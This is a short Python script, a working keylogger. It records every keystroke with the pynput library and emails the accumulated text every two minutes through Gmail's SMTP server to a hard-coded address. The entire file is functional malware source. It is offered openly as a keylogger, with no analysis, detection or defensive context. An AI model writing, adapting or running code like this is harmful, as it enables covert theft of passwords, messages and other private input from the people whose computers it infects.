from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import threading

LOG_FILE = "log.txt"
EMAIL_INTERVAL = 60 * 2  # Send email every 2 minutes

email_user = "marcosmith9000@gmail.com"
email_pass = "email password or passkey"
email_to = "marcosmith9000@gmail.com"

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

def send_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = f'Keylogger Report - {datetime.now()}'
        msg['From'] = email_user
        msg['To'] = email_to

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(email_user, email_pass)
                server.send_message(msg)
        except Exception as e:
            print("Email error:", e)

        log = ""

    threading.Timer(EMAIL_INTERVAL, send_email).start()

# Start keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

send_email()  # start the timer loop

listener.join()
